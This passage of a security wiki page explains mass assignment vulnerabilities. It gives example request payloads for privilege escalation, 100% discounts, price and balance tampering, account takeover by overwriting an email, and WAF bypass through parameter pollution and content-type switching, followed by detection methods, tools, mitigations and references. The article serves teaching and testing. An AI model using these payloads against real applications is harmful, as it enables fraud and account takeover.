+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;chosen_discount&#34;</span><span style="color:#f92672">:</span> {<span style="color:#960050;background-color:#1e0010"> </span><span style="color:#e6db74">&#34;percentage&#34;</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010"> </span><span style="color:#ae81ff">100</span><span style="color:#960050;background-color:#1e0010"> </span>},
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;chosen_products&#34;</span><span style="color:#f92672">:</span> [{<span style="color:#960050;background-color:#1e0010"> </span><span style="color:#e6db74">&#34;product_id&#34;</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010"> </span><span style="color:#e6db74">&#34;1&#34;</span>,<span style="color:#960050;background-color:#1e0010"> </span><span style="color:#e6db74">&#34;quantity&#34;</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010"> </span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010"> </span>}]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Successfully adding the hidden chosen_discount field allows for free purchases.9</p>
+<p><strong>3. Account Takeover (ATO)</strong></p>
+<p>Modifying identity-linked fields that are not in the UI but exist in the model.</p>
+<p><strong>Payload</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">api</span><span style="color:#f92672">/</span><span style="color:#a6e22e">user</span><span style="color:#f92672">/</span><span style="color:#a6e22e">update</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{<span style="color:#e6db74">&#34;first_name&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Attacker&#34;</span>, <span style="color:#e6db74">&#34;email&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;victim@gmail.com&#34;</span>}
+</span></span></code></pre></div><p>If the backend binds the email field, the attacker can then use the &ldquo;Forgot Password&rdquo; feature to send a reset link to the modified address.</p>
+<p><strong>Test Cases</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>Scenario</strong></th>
+<th><strong>Payload</strong></th>
+<th><strong>Expected Outcome</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Bypass Admin</td>
+<td>{&ldquo;isAdmin&rdquo;: true}</td>
+<td>Vertical privilege escalation.</td>
+</tr>
+<tr>
+<td>Update Balance</td>
+<td>{&ldquo;balance&rdquo;: 9999.99}</td>
+<td>Artificial funds injection.9</td>
+</tr>
+<tr>
+<td>Modify ID</td>
+<td>{&ldquo;id&rdquo;: 100, &ldquo;user_id&rdquo;: 1}</td>
+<td>Horizontal privilege escalation or DoS.8</td>
+</tr>
+<tr>
+<td>Price Tampering</td>
+<td>{&ldquo;price&rdquo;: 0.01}</td>
+<td>Purchasing luxury items for nominal costs.</td>
+</tr>
+<tr>
+<td>Status Bypass</td>
+<td>{&ldquo;verified&rdquo;: true}</td>
+<td>Bypassing email/KYC verification.9</td>
+</tr>
+</tbody>
+</table>
+<h2 id="bypasses--obfuscation">
+  <strong>Bypasses &amp; Obfuscation</strong>
+  <a class="anchor" href="#bypasses--obfuscation">#</a>
+</h2>
+<h3 id="1-http-parameter-pollution-hpp">
+  <strong>1. HTTP Parameter Pollution (HPP)</strong>
+  <a class="anchor" href="#1-http-parameter-pollution-hpp">#</a>
+</h3>
+<p>Exploiting how different servers handle duplicate parameters.</p>
+<p><strong>Payload</strong>: POST /update?role=user&amp;role=admin</p>
+<ul>
+<li>ASP.NET: May concatenate as user,admin.</li>
+<li>Ruby on Rails / PHP: May take the last occurrence (admin).</li>
+</ul>
+<h3 id="2-content-type-switching">
+  <strong>2. Content-Type Switching</strong>
+  <a class="anchor" href="#2-content-type-switching">#</a>
+</h3>
+<p>Bypassing WAFs that only inspect JSON or URL-encoded data.</p>
+<p>Original: Content-Type: application/json Switched: Content-Type: application/xml</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">User</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">username</span>&gt;<span style="color:#a6e22e">attacker</span>&lt;/<span style="color:#f92672">username</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">isAdmin</span>&gt;<span style="color:#66d9ef">true</span>&lt;/<span style="color:#f92672">isAdmin</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">User</span>&gt;
+</span></span></code></pre></div><p>Frameworks like Spring or .NET may automatically parse the XML into the same object model, ignoring the WAF&rsquo;s JSON-only rules.</p>
+<p><strong>3. Bracket Notation (Nested Objects)</strong></p>
+<p>Targeting deeply nested properties.</p>
+<p><strong>Payloads</strong>:</p>
+<ul>
+<li>user[role]=admin</li>
+<li>user[profile][isAdmin]=true</li>
+<li>{&ldquo;user&rdquo;: {&ldquo;permissions&rdquo;: [&ldquo;all&rdquo;]}}</li>
+</ul>
+<p><strong>Advanced Attack Scenarios</strong></p>
+<ol>
+<li><strong>Second-Order Mass Assignment</strong> Injecting a hidden parameter that is stored in the database and only &ldquo;bound&rdquo; later during a secondary process (e.g., an admin syncing tool or background job).</li>
+<li><strong>Blind Logic Exploitation</strong> In situations where the response does not echo values (Blind), use parameters identified from other endpoints (e.g., /api/v1/debug or /api/v1/documentation) to guess fields for the update endpoint.</li>
+</ol>
+<h2 id="detection-techniques">
+  <strong>Detection Techniques</strong>
+  <a class="anchor" href="#detection-techniques">#</a>
+</h2>
+<p><strong>Manual Detection</strong></p>
+<ul>
+<li><strong>Response Analysis</strong>: Perform a GET request on your own profile. Any field in the JSON response (e.g., &ldquo;internal_role&rdquo;: &ldquo;user&rdquo;) is a target for a POST or PUT request.4</li>
+<li><strong>Privilege Comparison</strong>: Use two accounts (Admin vs. User). Observe fields the Admin sends and attempt to replay them with the User account.7</li>
+<li><strong>Fuzzing</strong>: Use wordlists of common attributes (like admin, status, role) against update endpoints.</li>
+</ul>
+<p><strong>Automated Detection</strong></p>
+<ul>
+<li>Burp Suite: Use Param Miner to identify hidden parameters or Intruder with wordlists.</li>
+<li>Arjun: Automated parameter discovery for hidden inputs.</li>
+<li>SAST Tools: Tools like Snyk or SonarQube to find insecure patterns like req.body being passed directly to ORM functions.</li>
+</ul>
+<h2 id="impact">
+  <strong>Impact</strong>
+  <a class="anchor" href="#impact">#</a>
+</h2>
+<ul>
+<li><strong>Full Account Takeover (ATO)</strong>: Hijacking victim accounts without user interaction.10</li>
+<li><strong>Privilege Escalation</strong>: Gaining administrative control over the application.</li>
+<li><strong>Financial Fraud</strong>: Modifying prices, balances, or refund statuses.</li>
+<li><strong>Data Tampering</strong>: Overwriting critical timestamps, logs, or system settings.9</li>
+</ul>
+<h2 id="tools">
+  <strong>Tools</strong>
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<ul>
+<li>Burp Suite: Repeater, Intruder, and Param Miner extension.</li>
+<li>Postman: Manual API payload testing.9</li>
+<li>Arjun: Hidden parameter discovery.</li>
+<li>Snyk Code: Static analysis for vulnerable binding patterns.</li>
+</ul>
+<h2 id="mitigation--prevention">
+  <strong>Mitigation &amp; Prevention</strong>
+  <a class="anchor" href="#mitigation--prevention">#</a>
+</h2>
+<ul>
+<li>
+<blockquote>
+<p> <strong>Data Transfer Objects (DTOs)</strong> The most secure method. Create separate classes for user input that only include safe fields.9 Secure Flow: Request → UserRegistrationDTO (only name/pass) → User Object.9</p>
+</blockquote>
+</li>
+<li>
+<blockquote>
+<p> <strong>Explicit Allow-listing (Whitelisting)</strong></p>
+</blockquote>
+</li>
+<li>Java (Spring): @InitBinder with binder.setAllowedFields([&ldquo;name&rdquo;, &ldquo;email&rdquo;]).9</li>
+<li>PHP (Laravel): Define the $fillable array in the Model.</li>
+<li>Ruby on Rails: Use Strong Parameters with params.require(:user).permit(:name, :email).14</li>
+<li>Node.js (Mongoose): Use _.pick(req.body, [&rsquo;name&rsquo;, &rsquo;email&rsquo;]) or schema protection { protect: true }.</li>
+<li>
+<blockquote>
+<p> <strong>Block-listing (Less Secure)</strong></p>
+</blockquote>
+</li>
+<li>ASP.NET Core: Use the [BindNever] or [JsonIgnore] attributes on properties.5</li>
+<li>PHP (Laravel): Define the $guarded array in the Model.</li>
+</ul>
+<h2 id="good-to-read">
+  <strong>Good To Read</strong>
+  <a class="anchor" href="#good-to-read">#</a>
+</h2>
+<p><strong>HackerOne Reports</strong></p>
+<ul>
+<li>Uber (#99424): Driver could change their name to anything after acceptance via mass assignment.</li>
+<li>Shopify (Stocky): Unrestricted admin account creation via direct POST to /users/create_admin using a hijacked token.14</li>
+<li>GitHub (2012): The classic incident where a researcher added an SSH key to the Rails organization.1</li>
+</ul>
+<p><strong>Bugcrowd Reports</strong></p>
+<ul>
+<li>ATO via Profile Update: Discussion on modifying email during profile updates to achieve account takeover.12</li>
+</ul>
+<h2 id="references">
+  <strong>References</strong>
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment" target="_blank" rel="noreferrer noopener nofollow">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html" target="_blank" rel="noreferrer noopener nofollow">https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability" target="_blank" rel="noreferrer noopener nofollow">https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://learn.snyk.io/lesson/mass-assignment/" target="_blank" rel="noreferrer noopener nofollow">https://learn.snyk.io/lesson/mass-assignment/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Mass%20Assignment/" target="_blank" rel="noreferrer noopener nofollow">https://swisskyrepo.github.io/PayloadsAllTheThings/Mass%20Assignment/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+</ul>
+<h2 id="works-cited">
+  <strong>Works cited</strong>
+  <a class="anchor" href="#works-cited">#</a>
+</h2>
+<ul>
+<li>Mass Assignment - OWASP Cheat Sheet Series, accessed February 20, 2026, <a href="https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html" target="_blank" rel="noreferrer noopener nofollow">https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li>Mass Assignment - Payloads All The Things, accessed February 20, 2026, <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Mass%20Assignment/" target="_blank" rel="noreferrer noopener nofollow">https://swisskyrepo.github.io/PayloadsAllTheThings/Mass%20Assignment/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li>API6:2019 - Mass Assignment - OWASP API Security Top 10, accessed February 20, 2026, <a href="https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/" target="_blank" rel="noreferrer noopener nofollow">https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li>What is mass assignment? | Tutorial &amp; examples - Snyk Learn, accessed February 20, 2026, <a href="https://learn.snyk.io/lesson/mass-assignment/" target="_blank" rel="noreferrer noopener nofollow">https://learn.snyk.io/lesson/mass-assignment/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li>Mass assignment vulnerability - Wikipedia, accessed February 20, 2026, <a href="https://en.wikipedia.org/wiki/Mass_assignment_vulnerability" target="_blank" rel="noreferrer noopener nofollow">https://en.wikipedia.org/wiki/Mass_assignment_vulnerability</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li>Mass Assignment in .NET | SecureFlag Security Knowledge Base, accessed February 20, 2026, <a href="https://knowledge-base.secureflag.com/vulnerabilities/inadequate_input_validation/mass_assignment__net.html" target="_blank" rel="noreferrer noopener nofollow">https://knowledge-base.secureflag.com/vulnerabilities/inadequate_input_validation/mass_assignment__net.html</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li>Testing for Mass Assignment - wstg - GitHub, accessed February 20, 2026, <a href="https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment.md" target="_blank" rel="noreferrer noopener nofollow">https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment.md</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li>Testing for Mass Assignment - WSTG - Latest | OWASP Foundation, accessed February 20, 2026, <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment" target="_blank" rel="noreferrer noopener nofollow">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li>Mass Assignment: When Your API Accepts Too Much Trust | by InstaTunnel | Medium, accessed February 20, 2026, <a href="https://medium.com/@instatunnel/mass-assignment-when-your-api-accepts-too-much-trust-2bd5d675e843" target="_blank" rel="noreferrer noopener nofollow">https://medium.com/@instatunnel/mass-assignment-when-your-api-accepts-too-much-trust-2bd5d675e843</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li>Mass Assignment: Account Takeovers and Security Risks - DeepStrike, accessed February 20, 2026, <a href="https://deepstrike.io/blog/mass-assignment-techniques" target="_blank" rel="noreferrer noopener nofollow">https://deepstrike.io/blog/mass-assignment-techniques</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li>Lab: Exploiting a mass assignment vulnerability | Web Security Academy - PortSwigger, accessed February 20, 2026, <a href="https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability" target="_blank" rel="noreferrer noopener nofollow">https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li>Access Control vs Account Takeover: What Bug Bounty Hunters Need to Know | @Bugcrowd, accessed February 20, 2026, <a href="https://www.bugcrowd.com/blog/access-control-vs-account-takeover-what-bug-bounty-hunters-need-to-know/" target="_blank" rel="noreferrer noopener nofollow">https://www.bugcrowd.com/blog/access-control-vs-account-takeover-what-bug-bounty-hunters-need-to-know/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li>Secure Coding Guidelines | Mass Assignment, accessed February 20, 2026, <a href="https://learn.securecodewarrior.com/secure-coding-guidelines/mass-assignment" target="_blank" rel="noreferrer noopener nofollow">https://learn.securecodewarrior.com/secure-coding-guidelines/mass-assignment</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li>How to Fix &ldquo;Mass Assignment&rdquo; Vulnerabilities - OneUptime, accessed February 20, 2026, <a href="https://oneuptime.com/blog/post/2026-01-24-mass-assignment-vulnerabilities/view" target="_blank" rel="noreferrer noopener nofollow">https://oneuptime.com/blog/post/2026-01-24-mass-assignment-vulnerabilities/view</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li>How a Privilege Escalation Led to Unrestricted Admin Account &hellip;, accessed February 20, 2026, <a href="https://www.hackerone.com/blog/how-privilege-escalation-led-unrestricted-admin-account-creation-shopify" target="_blank" rel="noreferrer noopener nofollow">https://www.hackerone.com/blog/how-privilege-escalation-led-unrestricted-admin-account-creation-shopify</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
+      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
+      <span>August 5, 2026</span>
+    </a>
+  </div>
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/Mass%20Assignment.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#mass-assignment">Mass Assignment</a>
+      <ul>
+        <li><a href="#understanding-mass-assignment-basics"><strong>Understanding Mass Assignment Basics</strong></a>
+          <ul>
+            <li><a href="#typical-mapping-process"><strong>Typical Mapping Process</strong></a></li>
+            <li><a href="#alternative-framework-nomenclature"><strong>Alternative Framework Nomenclature</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#common-sensitive-attributes-wordlist"><strong>Common Sensitive Attributes (Wordlist)</strong></a></li>
+        <li><a href="#mass-assignment-attack-surface"><strong>Mass Assignment Attack Surface</strong></a></li>
+        <li><a href="#exploiting-mass-assignment"><strong>Exploiting Mass Assignment</strong></a>
+          <ul>
+            <li><a href="#1-privilege-escalation"><strong>1. Privilege Escalation</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#bypasses--obfuscation"><strong>Bypasses &amp; Obfuscation</strong></a>
+          <ul>
+            <li><a href="#1-http-parameter-pollution-hpp"><strong>1. HTTP Parameter Pollution (HPP)</strong></a></li>
+            <li><a href="#2-content-type-switching"><strong>2. Content-Type Switching</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#detection-techniques"><strong>Detection Techniques</strong></a></li>
+        <li><a href="#impact"><strong>Impact</strong></a></li>
+        <li><a href="#tools"><strong>Tools</strong></a></li>
+        <li><a href="#mitigation--prevention"><strong>Mitigation &amp; Prevention</strong></a></li>
+        <li><a href="#good-to-read"><strong>Good To Read</strong></a></li>
+        <li><a href="#references"><strong>References</strong></a></li>
+        <li><a href="#works-cited"><strong>Works cited</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
